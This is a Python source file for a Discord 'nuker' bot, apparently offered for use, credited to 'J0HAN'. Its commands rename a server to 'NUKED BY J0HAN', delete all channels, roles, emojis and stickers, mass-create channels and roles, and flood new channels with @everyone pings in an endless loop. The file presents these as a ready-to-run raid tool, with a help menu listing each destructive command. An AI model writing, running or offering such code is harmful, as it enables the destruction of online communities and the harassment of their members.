
# Developed by J0HAN

import discord, asyncio
from colorama import Fore

# Set-up
print(Fore.WHITE)
try:
    with open("config.txt") as file:
        token = file.readline()
        userID = file.readline()
        prefix = file.readline()
except:
    print(Fore.RED + "Error: Check your 'config.txt' file for any mistakes")

if prefix == "":
    print(Fore.YELLOW + "Warning: Your prefix is set as whitespace")

client = discord.Client(intents=discord.Intents.all())

print(Fore.BLACK)

# Console
@client.event
async def on_ready():
    print(Fore.BLUE + """
     ██╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║  ██║██╔══██╗████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║███████║███████║██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔══██║██╔══██║██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
""")
    user = await client.fetch_user(userID)
    print(Fore.WHITE + f"Bot: {client.user}")
    print(f"User: {user}")
    print(f"Prefix: {prefix}")

# Main
@client.event
async def on_message(message):
    msg = message.content
    
    # Commands
    async def message_spam(channel, message):
        while True:
            try:
                await channel.send("@everyone " + message)
                print(Fore.GREEN + "Spam message sent!")
            except:
                print(Fore.YELLOW + "Unable to send spam message.")
                await asyncio.sleep(0.1)
    
    async def mass_channel_ping(amount, channel_name, spam_message):
        print(Fore.WHITE + "\nBeginning mass channel ping...")
        channels_made = 0
        while int(channels_made) < int(amount):
            try:
                new_channel = await message.guild.create_text_channel(channel_name)
                channels_made += 1
                print(Fore.GREEN + "Text channel created!")
                await message_spam(new_channel, spam_message)
            except:
                print(Fore.YELLOW + "Unable to create text channel.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass channel ping has been finished!")

    async def del_channels():
        print(Fore.WHITE + "\nDeleting all the channels...")
        for channel in message.guild.channels:
            try:
                await channel.delete()
                print(Fore.GREEN + "Channel deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete channel.")
        print(Fore.WHITE + "All channels that can be deleted have been deleted. Tip: disable community to delete the rules and community updates channels.")
    
    async def del_roles():
        print(Fore.WHITE + "\nDeleting all the roles...")
        for role in message.guild.roles:
            try:
                await role.delete()
                print(Fore.GREEN + f"Role deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete role.")
        print(Fore.WHITE + "All roles that can be deleted have been deleted.")

    async def del_emojis():
        print(Fore.WHITE + "\nDeleting all the emojis...")
        for emoji in message.guild.emojis:
            try:
                await emoji.delete()
                print(Fore.GREEN + f"Emoji deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete emoji.")
        print(Fore.WHITE + "All emojis that can be deleted have been deleted.")
    
    async def del_stickers():
        print(Fore.WHITE + "\nDeleting all the stickers...")
        for sticker in message.guild.stickers:
            try:
                await sticker.delete()
                print(Fore.GREEN + f"Sticker deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete sticker.")
        print(Fore.WHITE + "All stickers that can be deleted have been deleted.")
    
    async def mass_channels(amount, channel_name):
        print(Fore.WHITE + "\nMass channel creation is in progress...")
        channels_made = 0
        while int(channels_made) < int(amount):
            try:
                await message.guild.create_text_channel(channel_name)
                channels_made += 1
                print(Fore.GREEN + "Text channel created!")
            except:
                print(Fore.YELLOW + "Unable to create text channel.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass channel creation has been finished!")

    async def mass_roles(amount, role_name):
        print(Fore.WHITE + "\nMass role creation is in progress...")
        roles_made = 0
        while int(roles_made) < int(amount):
            try:
                await message.guild.create_role(name=role_name)
                roles_made += 1
                print(Fore.GREEN + "Role has been created!")
            except:
                print(Fore.YELLOW + "Unable to create role.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass role creation has been finished!")

    # Commands (feel free to rename)
    try:
        if msg.startswith(f"{prefix}help"):
            print(Fore.WHITE + f"\n'{prefix}help' command used!")
            try:
                await message.reply(f"""💥 **Johan's Nuker**
Revamped help menu soon that'll be an embed!
**Commands:**
* {prefix}nuke - Automatic nuke
* {prefix}mcp [amount] [channel name] [spam message] - Creates channels and then pings everyone
* {prefix}del - Deletes all channels, roles, emojis, and stickers
* {prefix}cdel - Deletes all channels
* {prefix}rdel - Deletes all roles
* {prefix}edel - Deletes all emojis
* {prefix}sdel - Deletes all stickers
* {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
* {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want""")
                print(Fore.GREEN + "Help message successfully sent!")
            except:
                print(Fore.YELLOW + "Unable to send help message.")

        if msg.startswith(f"{prefix}nuke"):
            await message.guild.edit(name="NUKED BY J0HAN")
            await del_channels()
            await del_roles()
            await mass_channels(5, "johan-was-here")
            await mass_roles(5, "J0HAN WAS HERE")
            print(Fore.BLUE + "\nNUKE OVER!")

        if msg.startswith(f"{prefix}mcp"):
            command = msg.split(" ")
            await mass_channel_ping(command[1], command[2], command[3])

        if msg.startswith(f"{prefix}del"):
            await del_channels()
            await del_roles()
            await del_emojis()
            await del_stickers()
            print(Fore.BLUE + "\nMASS DELETION OVER")
            
        if msg.startswith(f"{prefix}cdel"):
            await del_channels()

        if msg.startswith(f"{prefix}rdel"):
            await del_roles()

        if msg.startswith(f"{prefix}edel"):
            await del_emojis()

        if msg.startswith(f"{prefix}sdel"):
            await del_stickers()

        if msg.startswith(f"{prefix}channels"):
            command = msg.split(" ")
            if not command[1] == None:
                if command[1] == isinstance(command[1], int):
                    if not command[2] == None:
                        await mass_channels(command[1], command[2])

        if msg.startswith(f"{prefix}roles"):
            command = msg.split(" ")
            if not command[1] == None:
                if command[1] == isinstance(command[1], int):
                    if not command[2] == None:
                        await mass_roles(command[1], command[2])
    except:
        print(Fore.RED + "Looks like you encountered an unknown error.")

client.run(token)
